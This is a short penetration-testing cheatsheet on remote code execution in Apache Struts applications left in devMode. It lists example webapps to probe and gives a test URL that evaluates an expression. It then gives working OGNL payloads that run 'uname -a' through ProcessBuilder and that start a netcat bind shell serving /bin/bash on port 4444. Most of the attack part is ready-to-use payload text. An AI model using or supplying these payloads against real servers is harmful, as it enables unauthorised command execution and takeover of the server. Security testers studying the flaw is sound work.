## Apache Struts Remote Code Execution cheatsheet

Apacje Struts is a open source framework utilizing JavaEE web applications and encouraging to employ MVC (Model View Controller) architecture.
When having the application developed in so-called **_devMode_** as set in the _struts.xml_ file:

``` <constant name="struts.devMode" value="true" />```

Then the middleware will be handling additional parameters passed to every function invocation.

### Testing for Struts devMode enabled

The most straightforward way to test for *devMode* enabled setting is to find an example JSP/WAR/JavaEE application within the server and then passed there specially crafted parameters.
The below list of commands is supported by the *devMode* in Struts:
- `debug=command`
- `debug=xml`
- `debug=console`
- `debug=browser`

There are the below most recognizeable example applications often deployed on the Tomcat webserver:

- the Struts 1:
 - struts-blank
 - struts-cookbook
 - struts-el-example
 - struts-examples
 - struts-faces-example
 - struts-faces-example2
 - struts-mailreader
 - struts-scripting-mailreader
- the Struts 2:
 - struts2-blank
 - struts2-rest-showcase
 - struts2-mailreader
 - struts2-showcase
 - struts2-portlet

By choosing one of them, testing whether it exists on target web server and passing special parameters, we can assure the Struts framework has been configured to use *devMode*. 
```
http://target/struts2-blank/example/HelloWorld.action?debug=command&expression=1%2b1
```
Firstly, we can see that those parameters are to be passed to the **.action** requests. Secondly, the above URL utilizes *struts2-blank* example webapplication, that may not be found on test server. In such situation one should go and test the very same parameters for actually deployed application.

There are those two most important parameters:
- `debug=command`
- `expression=<java_code>`

The *expression* parameter is where we will type our **Remote Code Execution** _payload_ .
When the above invocation will result with **2** in response body - we will be sure that the expression got evaluated, and thus the application is vulnerable to RCE.

### Utilizing RCE

Now, in order to execute one command, and get the first line out of it - there can be used the following expression: 
```
?debug=command&expression=new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder('uname -a').start().getInputStream())).readLine()
```

Where we have invocation of **uname -a** command within linux boxes.
In order to drop a bind shell on the server, the following method could be leveraged:

1. Pass the command as a String array:
..`new java.lang.String[]{'/bin/nc','-l','-p','4444','-e','"/bin/bash -i"'}`
2. Invoke the above expression with the array being passed to the *ProcessBuilder*
```
?debug=command&expression=new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/nc','-l','-p','4444','-e','"/bin/bash -i"'}).start().getInputStream())).readLine()
```

After that, the *bash* shell will bind to the 4444 port.